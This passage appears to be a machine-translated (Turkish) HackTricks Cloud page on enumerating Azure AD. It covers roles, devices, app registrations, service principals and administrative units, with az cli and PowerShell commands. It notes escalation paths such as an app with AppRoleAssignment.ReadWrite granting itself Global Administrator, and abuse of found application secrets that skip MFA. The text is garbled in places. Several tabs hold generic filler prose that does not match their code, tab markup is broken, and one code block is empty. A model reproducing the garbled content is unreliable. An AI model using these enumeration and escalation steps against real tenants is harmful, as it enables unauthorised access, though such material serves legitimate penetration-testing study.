Get-AzureADDirectoryRole -ObjectId <roleID> #Get info about the role
# Get custom roles - use AzureAdPreview
Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
# Users assigned a role (Global Administrator)
Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
Get-AzureADDirectoryRole -ObjectId <id> | fl
# Roles of the Administrative Unit (who has permissions over the administrative unit and its members)
Get-AzureADMSScopedRoleMembership -Id <id> | fl *
```
{% endtab %}

{% tab title="Az PowerShell" %} 

Azure AD ile çalışırken, Azure PowerShell modülünü kullanarak bir dizi işlem gerçekleştirebilirsiniz. Bu modül, Azure AD'deki nesneleri yönetmek için kullanışlı cmdlet'ler sağlar. İşte bazı temel işlemler:

- Kullanıcı hesaplarını yönetme
- Gruplar oluşturma ve yönetme
- Uygulamaları yapılandırma ve yönetme
- Politikaları yapılandırma ve yönetme

Azure PowerShell modülünü kullanarak Azure AD üzerinde birçok farklı görevi otomatikleştirebilir ve yönetebilirsiniz. Bu, büyük ölçekli ortamlarda zaman kazanmanıza ve işlerinizi daha verimli bir şekilde yapmanıza yardımcı olabilir. 

{% endtab %}
```powershell
# Get role assignments on the subscription
Get-AzRoleDefinition
# Get Role definition
Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
# Get roles of a user or resource
Get-AzRoleAssignment -SignInName test@corp.onmicrosoft.com
Get-AzRoleAssignment -Scope /subscriptions/<subscription-id>/resourceGroups/<res_group_name>/providers/Microsoft.Compute/virtualMachines/<vm_name>
```
{% endtab %}

{% tab title="Ham" %}Bu belge, Azure Active Directory (Azure AD) hedeflerine yönelik saldırı vektörlerini ve saldırı tekniklerini açıklar. Azure AD'nin güvenliğini değerlendirmek ve zayıf noktaları tespit etmek için bu bilgileri kullanabilirsiniz.{% endtab %}
```powershell
# Get permissions over a resource using ARM directly
$Token = (Get-AzAccessToken).Token
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```
### Cihazlar

{% tabs %}
{% tab title="az cli" %}
```bash
# If you know how to do this send a PR!
```
{% endtab %}

{% tab title="Azure AD" %}

Azure AD, Microsoft'un kimlik ve erişim yönetimi bulut hizmetidir. Azure AD, kullanıcı kimliklerini ve erişim haklarını yönetmek için kullanılır. Bu hizmet, kimlik doğrulama, erişim denetimi ve güvenlik politikalarını uygulamak için kullanılır.

Azure AD, bulut uygulamalarına ve diğer Microsoft bulut hizmetlerine tek oturum açma (SSO) sağlar. Ayrıca çok faktörlü kimlik doğrulama, rol tabanlı erişim denetimi ve diğer güvenlik özelliklerini destekler.

Azure AD, kuruluşların bulut kaynaklarına güvenli bir şekilde erişmelerine yardımcı olur ve kimlik avı gibi saldırılara karşı koruma sağlar.

{% endtab %}
```powershell
# Enumerate Devices
Get-AzureADDevice -All $true | fl *
# List all the active devices (and not the stale devices)
Get-AzureADDevice -All $true | ?{$_.ApproximateLastLogonTimeStamp -ne $null}
# Get owners of all devices
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredOwner
Get-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredOwner -ObjectId $_.ObjectID){$_;$user.UserPrincipalName;"`n"}}
# Registred users of all the devices
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredUser
Get-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredUser -ObjectId $_.ObjectID){$_;$user.UserPrincipalName;"`n"}}
# Get dives managed using Intune
Get-AzureADDevice -All $true | ?{$_.IsCompliant -eq "True"}
# Get devices owned by a user
Get-AzureADUserOwnedDevice -ObjectId test@corp.onmicrosoft.com
# Get Administrative Units of a device
Get-AzureADMSAdministrativeUnit | where { Get-AzureADMSAdministrativeUnitMember -ObjectId $_.ObjectId | where {$_.ObjectId -eq $deviceObjId} }
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
Bir cihaz (VM) **AzureAD'e katıldığında**, AzureAD'den kullanıcılar **giriş yapabilecek**.\
Ayrıca, giriş yapan kullanıcı cihazın **Sahibi** ise, o kullanıcı **yerel yönetici** olacaktır.
{% endhint %}

### Uygulamalar

{% hint style="info" %}
**Uygulamalar**, portalda **Uygulama Kayıtları**dır (Kurumsal Uygulamalar değil).\
Ancak her Uygulama Kaydı aynı isimle bir **Kurumsal Uygulama** (**Hizmet İlkesi**) oluşturacaktır.\
Ayrıca, Uygulama çok kiracılı bir Uygulama ise, **başka** bir Kurumsal Uygulama (**Hizmet İlkesi**) aynı isimle **o kiracıda** oluşturulacaktır.
{% endhint %}

Bir Uygulama oluşturulduğunda 2 tür izin verilir:

* **Hizmet İlkesine** verilen **İzinler**
* **Uygulamanın** kullanıcı **adına sahip olabileceği ve kullanabileceği İzinler**.
```bash
# List Apps
az ad app list
az ad app list --query "[].[displayName]" -o table
# Get info of 1 App
az ad app show --id 00000000-0000-0000-0000-000000000000
# Search App by string
az ad app list --query "[?contains(displayName,'app')].displayName"
# Get the owner of an application
az ad app owner list --id <id> --query "[].[displayName]" -o table
# List all the apps with an application password
az ad app list --query "[?passwordCredentials != null].displayName"
# List apps that have key credentials (use of certificate authentication)
az ad app list --query "[?keyCredentials != null].displayName"
```
{% endtab %}

{% tab title="Azure AD" %}

## Azure AD

Azure Active Directory (Azure AD) is Microsoft's cloud-based identity and access management service. It allows organizations to manage user identities and create access policies to secure their resources.

### Security Best Practices

- Enable Multi-Factor Authentication (MFA) for all users to add an extra layer of security.
- Regularly review and audit user permissions to ensure least privilege access.
- Monitor sign-in logs and set up alerts for any suspicious activities.
- Implement Conditional Access policies to control access based on specific conditions.
- Enable password protection and smart lockout to prevent password attacks.

### Common Security Issues

- Weak or reused passwords leading to credential stuffing attacks.
- Lack of MFA allowing unauthorized access in case of password compromise.
- Overly permissive user permissions leading to data breaches.
- Lack of monitoring and alerting allowing malicious activities to go unnoticed.

### Tools and Techniques

- Azure AD Identity Protection for detecting potential vulnerabilities and risky accounts.
- Azure AD Privileged Identity Management for managing, controlling, and monitoring privileged identities.
- Azure AD Conditional Access for setting policies to grant or block access based on specific conditions.

{% endtab %}
```powershell
# List all registered applications
Get-AzureADApplication -All $true
# Get details of an application
Get-AzureADApplication -ObjectId <id>  | fl *
# List all the apps with an application password
Get-AzureADApplication -All $true | %{if(Get-AzureADApplicationPasswordCredential -ObjectID $_.ObjectID){$_}}
# Get owner of an application
Get-AzureADApplication -ObjectId <id> | Get-AzureADApplicationOwner |fl *
```
{% endtab %}

{% tab title="Az PowerShell" %} 

Azure AD ile çalışırken, Azure PowerShell modülünü kullanarak bir dizi işlem gerçekleştirebilirsiniz. İşte bazı temel işlemler:

- Yeni bir Azure AD kullanıcısı oluşturma
- Varolan bir kullanıcının bilgilerini güncelleme
- Kullanıcı hesaplarını listeleme ve filtreleme
- Kullanıcı hesaplarını etkinleştirme veya devre dışı bırakma
- Kullanıcı hesaplarını silme

Azure PowerShell modülü, Azure AD ile etkileşimde bulunmak için güçlü bir araçtır ve birçok yönetim görevini otomatikleştirmenize olanak tanır. Bu modülü kullanarak Azure AD güvenliğini güçlendirebilir ve yönetim süreçlerinizi kolaylaştırabilirsiniz.

{% endtab %}
```powershell
# Get Apps
Get-AzADApplication
# Get details of one App
Get-AzADApplication -ObjectId <id>
# Get App searching by string
Get-AzADApplication | ?{$_.DisplayName -match "app"}
# Get Apps with password
Get-AzADAppCredential
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
**`AppRoleAssignment.ReadWrite`** izni olan bir uygulama, kendisine rol vererek **Global Yönetici** seviyesine **yükselme** yeteneğine sahiptir.\
Daha fazla bilgi için [**burayı kontrol edin**](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48).
{% endhint %}

{% hint style="info" %}
Bir uygulamanın bir belirteç istediğinde kimliğini kanıtlamak için kullandığı gizli dizedir.\
Bu **şifreyi** bulursanız, **kiracı** içinde **hizmet başkanı** olarak erişebilirsiniz.\
Bu şifre yalnızca oluşturulduğunda görünürdür (değiştirebilirsiniz ancak tekrar alamazsınız).\
Uygulamanın **sahibi** buna bir **şifre ekleyebilir** (böylece onu taklit edebilir).\
Bu hizmet başkanları olarak giriş yapmak **riskli olarak işaretlenmez** ve **MFA'ya sahip olmazlar**.
{% endhint %}

### Uygulamalar ve (Kurumsal Uygulamalar veya Hizmet Başkanları) Arasındaki Fark

Azure'da bir uygulama ile bir Hizmet Başkanı arasındaki fark:

* **Uygulama/Uygulama Kayıtları**: Azure AD'nizde var olan uygulamalardır
* `(Get-AzureADApplication -filter "DisplayName eq 'testapp'")`
* **Hizmet Başkanı/Kurumsal Uygulamalar**: Azure AD'nizdeki güvenlik nesneleridir ve Azure Dizininde **ayrıcalıklara** sahip olabilirler ve uygulamanıza veya üçüncü taraf uygulamaya bağlıdırlar
* `Get-AzureADServicePrincipal -filter "DisplayName eq 'testapp'")`
* Bir yönetici, verilen izinler çok hassassa onaylaması gerekebilir.

Bir uygulama **Üçüncü taraf kiracısını** çalıştırabilir ve onu kullanmaya başladığınızda ve erişim verdiğinizde, ihtiyaç duyduğu bilgilere erişim sağlamak için **Kurumsal Uygulama/Hizmet Başkanı kiracınızda oluşturulur**:

### Yönetim Birimleri

Kullanıcıların daha iyi yönetimi için kullanılır.

Yönetim birimleri, bir roldeki izinleri tanımladığınız kuruluşunuzun herhangi bir bölümüne **izinleri kısıtlar**. Örneğin, [Yardım Masası Yöneticisi](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#helpdesk-administrator) rolünü bölgesel destek uzmanlarına devretmek için yönetim birimlerini kullanabilirsiniz, böylece yalnızca destek verdikleri bölgedeki kullanıcıları yönetebilirler.

Bu nedenle, yönetici birimine roller atayabilir ve üyeleri bu rolleri alacaktır.
```
```
{% endtab %}

{% tab title="AzureAD" %}

## Azure Active Directory (AzureAD)

Azure Active Directory (AzureAD) is Microsoft's cloud-based identity and access management service. It allows organizations to manage user identities and create access policies to secure their resources.

### Enumeration

When conducting a penetration test on AzureAD, enumeration is a crucial phase. Enumerating users, groups, roles, and permissions can provide valuable information for further attacks.

#### Tools

There are various tools available for enumerating AzureAD, such as:

- [Azure AD Recon](https://github.com/NetSPI/AzureADRecon)
- [Azure AD Connect Configuration Documenter](https://github.com/Microsoft/AADConnectConfigDocumenter)

### Exploitation

After enumeration, the next step is exploitation. Exploiting misconfigurations, weak permissions, or vulnerabilities in AzureAD can lead to unauthorized access or privilege escalation.

#### Techniques

Common exploitation techniques in AzureAD include password spraying, phishing attacks, and exploiting OAuth vulnerabilities.

### Post-Exploitation

Once access is gained, post-exploitation activities can include data exfiltration, lateral movement, and maintaining persistence within the AzureAD environment.

#### Recommendations

To secure AzureAD, it is essential to follow security best practices such as enforcing strong passwords, enabling multi-factor authentication, monitoring for suspicious activities, and regularly reviewing and updating access controls.

{% endtab %}
```powershell
# Get Administrative Units
Get-AzureADMSAdministrativeUnit
Get-AzureADMSAdministrativeUnit -Id <id>
# Get ID of admin unit by string
$adminUnitObj = Get-AzureADMSAdministrativeUnit -Filter "displayname eq 'Test administrative unit 2'"
# List the users, groups, and devices affected by the administrative unit
Get-AzureADMSAdministrativeUnitMember -Id <id>
# Get the roles users have over the members of the AU
Get-AzureADMSScopedRoleMembership -Id <id> | fl #Get role ID and role members
```
{% endtab %}
{% endtabs %}

## Azure AD Kimlik Koruma (AIP) <a href="#title-text" id="title-text"></a>

Azure AD Kimlik Koruma (AIP), Azure Active Directory'deki kullanıcı kimliklerini tehlikeye atılmaktan korumaya yardımcı olmak için **otomatik tespit ve iyileştirme kullanan bir güvenlik hizmetidir**. AIP sürekli olarak kullanıcı oturum açmalarını ve kimlik yapılandırmalarını izler ve riskleri değerlendirir, **uygun güvenlik önlemlerini otomatik olarak uygular**, örneğin çok faktörlü kimlik doğrulama gerektirme veya potansiyel olarak tehlikeli faaliyetleri engelleme. Bu, organizasyonların kimlik tabanlı güvenlik ihlallerini önlemesine yardımcı olur.

Akış:

1. Azure AD Kimlik Koruma, kullanıcı etkinliklerini izler ve kullanıcı **oturum açmalarını, kimlik doğrulama** olaylarını ve diğer ilgili etkinlikleri veri toplar.
2. Hizmet, bu verileri analiz etmek ve potansiyel güvenlik tehditlerini tespit etmek için **makine öğrenimi** algoritmalarını kullanır.
3. Azure AD Kimlik Koruma, tehdide (örneğin oturum açma) bir risk seviyesi atar ve gerektiğinde otomatik bir eylem gerçekleştirmek için bir uyarı oluşturur.

## Azure AD Şifre Koruma (APP)

Azure AD Şifre Koruma (APP), Azure Active Directory'deki zayıf şifreleri engelleyerek güçlü şifre politikalarını zorlayarak **yardımcı olan bir güvenlik özelliğidir**. APP, **sıkça kullanılan zayıf şifreleri** ve bunların varyasyonlarını engeller, şifreyle ilgili ihlallerin riskini azaltır. Hem bulutta hem de yerindeki Active Directory'de uygulanabilir ve organizasyon genelinde şifre güvenliğini artırır.

### Referanslar

* [https://learn.microsoft.com/en-us/azure/active-directory/roles/administrative-units](https://learn.microsoft.com/en-us/azure/active-directory/roles/administrative-units)

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Destek HackTricks</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}
